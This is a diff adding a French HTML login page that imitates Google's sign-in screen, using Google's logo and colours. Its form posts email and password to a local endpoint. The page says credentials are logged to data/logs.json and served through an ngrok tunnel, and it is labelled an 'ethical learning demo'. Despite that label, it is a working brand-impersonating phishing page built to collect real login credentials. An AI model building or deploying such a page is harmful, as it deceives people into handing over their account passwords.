@@ -1,0 +1,42 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Connexion Google-like (démo éthique)</title>
+  <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+  <div class="card">
+    <div class="logo">
+      <img src="https://ssl.gstatic.com/firebasejs/ui/logo/googleg_onecolort.svg" alt="Google">
+      <span class="g">G</span><span class="r1">o</span><span class="r2">o</span><span class="r3">g</span><span class="r4">l</span><span class="r5">e</span>
+    </div>
+    <h1 class="title">Connexion</h1>
+
+    <form id="loginForm" action="/login" method="POST" autocomplete="off">
+      <div class="field">
+        <label for="email">Adresse e-mail ou numéro d’identifiant</label>
+        <input id="email" name="email" type="email" required>
+      </div>
+
+      <div class="field">
+        <label for="password">Mot de passe</label>
+        <input id="password" name="password" type="password" required minlength="1">
+      </div>
+
+      <div class="hint">
+        ⓘ <span>Exemple pédagogique — aucune donnée n’est chiffrée ni expulsée publiquement.
+          Stockage local <code>data/logs.json</code> uniquement, exclu du repo.</span>
+      </div>
+
+      <button type="submit" id="submitBtn">Connexion</button>
+    </form>
+
+    <p class="foot">Ce site est une <strong>démo éthique d’apprentissage</strong>
+      (formulaire login / JSON storage / tunnel ngrok) et ne collecte rien en production.</p>
+  </div>
+
+  <script src="/app.js"></script>
+</body>
+</html>
